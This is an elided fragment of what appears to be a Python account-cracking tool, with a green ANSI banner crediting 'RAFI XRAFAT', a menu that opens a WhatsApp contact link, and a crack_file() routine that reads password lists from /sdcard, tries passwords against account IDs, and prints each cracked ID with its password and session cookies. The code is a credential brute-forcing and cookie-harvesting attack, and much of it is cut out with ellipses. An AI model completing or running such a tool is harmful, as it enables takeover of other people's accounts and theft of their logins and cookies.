...
while attemps < 12345677901:
    username = input(' \033[0;92m  Username: ')
...
\033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝   \033[0;92m               
  \033[0;92m═════════════════════════════════════════════
\033[0;92m • CEO RAFI XRAFAT   FIRE (🥰)
...
def login():
	...
	if MAMA in ['m']:
		...
		os.system('xdg-open https://wa.me/+8801943595551')
	elif MAMA in ['0']:
...
def crack_file():
	...
	print('\033[1;32m [Put File Example:  /sdcard/rafi.txt  Etc...]')
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				#MAMA-King
				print(f'\r\033[0;92m[RAFI-➼-OK😻] {idf} • {pw}\n\033[0;93m[🔥]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m===============================================')
